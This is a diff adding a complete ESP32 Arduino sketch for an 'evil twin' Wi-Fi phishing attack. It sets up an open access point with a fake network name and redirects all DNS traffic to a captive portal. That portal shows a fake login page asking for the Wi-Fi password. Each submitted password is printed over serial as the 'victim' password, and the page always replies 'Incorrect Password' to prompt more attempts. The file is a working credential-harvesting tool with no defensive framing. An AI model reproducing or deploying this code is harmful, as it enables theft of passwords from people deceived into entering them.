@@ -1,0 +1,70 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+
+#define DNS_PORT 53
+DNSServer dnsServer;
+WebServer server(80);
+
+const char* ssid = "enter username";  // Your fake Wi-Fi name
+
+String victimPassword = "";
+
+// HTML page for password input
+String loginPage = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<title>Wi-Fi Login</title>
+</head>
+<body>
+<h2>Wi-Fi Password Required</h2>
+<form action="/submit" method="POST">
+<input type="password" name="password" placeholder="Enter Wi-Fi password">
+<input type="submit" value="Connect">
+</form>
+</body>
+</html>
+)rawliteral";
+
+// Handle root page
+void handleRoot() {
+  server.send(200, "text/html", loginPage);
+}
+
+// Handle form submission
+void handleSubmit() {
+  if (server.hasArg("password")) {
+    victimPassword = server.arg("password");
+    Serial.println("Victim entered password: " + victimPassword);  // Captured password
+  }
+  // Always say incorrect
+  server.send(200, "text/html", "<h2>Incorrect Password</h2><a href='/'>Try Again</a>");
+}
+
+void setup() {
+  Serial.begin(115200);
+
+  // Start Access Point
+  WiFi.softAP(ssid);
+  Serial.println("Access Point started: " + String(ssid));
+
+  // Redirect all DNS queries to ESP32
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+
+  // Setup web server routes
+  server.on("/", handleRoot);
+  server.on("/submit", HTTP_POST, handleSubmit);
+  server.onNotFound([]() {
+    server.sendHeader("Location", "/");
+    server.send(302, "text/plain", "");
+  });
+
+  server.begin();
+  Serial.println("Web server started");
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
